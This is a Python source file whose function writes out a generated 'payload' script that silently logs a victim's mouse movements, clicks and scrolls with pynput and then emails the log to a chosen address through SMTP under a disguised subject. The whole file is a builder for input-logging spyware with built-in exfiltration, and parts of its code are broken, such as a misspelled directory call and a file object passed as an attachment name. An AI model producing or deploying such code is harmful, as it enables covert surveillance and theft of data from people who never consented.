def create(destination, path, output_folder):
    payload = """from pynput import mouse, keyboard
from pynput.mouse import Button, Controller
from datetime import date
import time
import logging
import os
import smtplib
from email.message import EmailMessage

# Function to send an email with two log-files attached
def send_email(subject, message, destination, file):
    # Here you are to replace smtp.example.com with your Email Providers SMTP Servers and port (For SMTP - Usually 465)
    server = smtplib.SMTP('smtp.example.com', 465)
    server.starttls()
    # This is where you would replace "-------" with your Email and Password to log into your Account
    server.login('-------email-------', '-------password-------')

    msg = EmailMessage()

    message = f'{message}'
    msg.set_content(message)
    msg.add_header('Content-Disposition',
                   'attachment',
                   filename=file)

    msg['Subject'] = subject
    msg['From'] = 'IAmSendingThisEmail'
    msg['To'] = destination
    server.send_message(msg)

# Getting Current Date and time
t = time.localtime()
timeNow = time.strftime("%H:%M:%S", t)
dateNow = date.today()

# Making Controller Variable to Control/Monitor the Mouse
controller = Controller()

cwd = os.getcwd()
log_directory = os.path.join('""" + output_folder[:-1] + """')
if not os.path.exists(log_directory):
    os.makedir(log_directory)


def setup_logger(name, log_file, level=logging.INFO):

    handler = logging.FileHandler(log_file)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger

logs = open('""" + output_folder + """mouse_logs.txt', "a")
logs.truncate(0)
mouse_logger = setup_logger('mouse_logger', '""" + output_folder + """mouse_logs.txt')
mouse_logger.info("Date: " + str(dateNow) + "     ")
mouse_logger.info("Time: "+str(timeNow) + "     ")


def on_move(x, y):
    mouse_logger.info('Pointer moved to ,{0}'.format((x, y)))


def on_click(x, y, button, pressed):
    mouse_logger.info('{0} at ,{1}'.format('Pressed' if pressed else 'Released',(x, y)))


def on_scroll(x, y, dx, dy):
    mouse_logger.info('Scrolled {0} at ,{1}'.format('down' if dy < 0 else 'up',(x, y)))


# Collect events until released
with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener_m:
    listener_m.join()
send_email('Surpise', 'Default Message', """ + destination + """, logs)
    """
    with open(path, 'w') as file:
        file.write(payload)